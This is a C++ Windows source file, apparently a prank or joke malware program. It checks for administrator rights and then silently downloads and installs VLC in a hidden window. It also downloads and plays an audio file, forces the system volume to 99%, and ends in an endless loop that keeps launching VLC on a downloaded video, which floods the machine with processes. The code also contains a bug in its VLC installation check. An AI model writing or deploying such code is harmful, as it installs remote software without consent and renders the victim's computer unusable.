#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#include <system_error>
#include <cstdlib>
#include <Shellapi.h>
#include "Filepath.h"
#include "URL.h"
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")
#include <iostream>
#include <mmdeviceapi.h>
#include <endpointvolume.h>

bool downloadVLC(const std::wstring& url, const std::wstring& outfilename) {
    HRESULT hr = URLDownloadToFile(NULL, url.c_str(), outfilename.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}
bool isVLCInstalled() {
    LPCWSTR vlcPath = L"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe"; //defualt location
    DWORD dwAttrib = GetFileAttributes(vlcPath);
    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
bool installVLC(const std::wstring& installerPath) {
    SHELLEXECUTEINFO ShExecInfo = { 0 };
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = installerPath.c_str();
    ShExecInfo.lpParameters = L"/S"; // Silent install
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;

    if (!ShellExecuteEx(&ShExecInfo)) {
        return false;
    }

    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
    CloseHandle(ShExecInfo.hProcess);
    return true;
}
bool IsRunAsAdmin()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdminSID = nullptr;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdminSID))
    {
        dwError = GetLastError();
    }
    else
    {
        if (!CheckTokenMembership(NULL, pAdminSID, &fIsRunAsAdmin))
        {
            dwError = GetLastError();
        }

        FreeSid(pAdminSID);
    }

    return fIsRunAsAdmin == TRUE;
}
void SetVolume(float value) {
    //this shit is all stolen no idea how any of this works
    CoInitialize(nullptr);

    IMMDeviceEnumerator* deviceEnumerator = nullptr;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&deviceEnumerator));

    IMMDevice* defaultDevice = nullptr;
    deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();

    IAudioEndpointVolume* endpointVolume = nullptr;
    defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, nullptr, reinterpret_cast<void**>(&endpointVolume));
    defaultDevice->Release();

    // Set volume 
    endpointVolume->SetMasterVolumeLevelScalar(value, nullptr);

    endpointVolume->Release();
    CoUninitialize();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsRunAsAdmin())
    {
        MessageBox(NULL, L"This program needs to be ran as administrator \n\n                                                    -jake", L":(", MB_OK | MB_ICONASTERISK);
        std::exit(EXIT_FAILURE);
    }

    //Create folder
    if (!CreateDirectory(filePath, NULL) && ERROR_ALREADY_EXISTS != GetLastError()) {
        return 1;
    }


    //VLC setup
    if (isVLCInstalled) {
        downloadVLC(vlcUrl, outFile);
        installVLC(outFile);
    }


    //Download Credit card wav
    HRESULT CC = URLDownloadToFile(NULL, CreditCardURL, CreditCard, 0, NULL);
    PlaySoundW(CreditCard, NULL, SND_NOSTOP);
    
    //Video Download and playback 
    HRESULT VID = URLDownloadToFile(NULL, videoUrl, videoPath, 0, NULL);

    LPCWSTR args = L"--no-one-instance --play-and-exit";
    SetVolume(0.99);
    while (1) {
        HINSTANCE hai = ShellExecute(NULL, L"open", vlcPath, (std::wstring(args) + L" " + videoPath).c_str(), NULL, SW_SHOW);
    }
    return 0;
}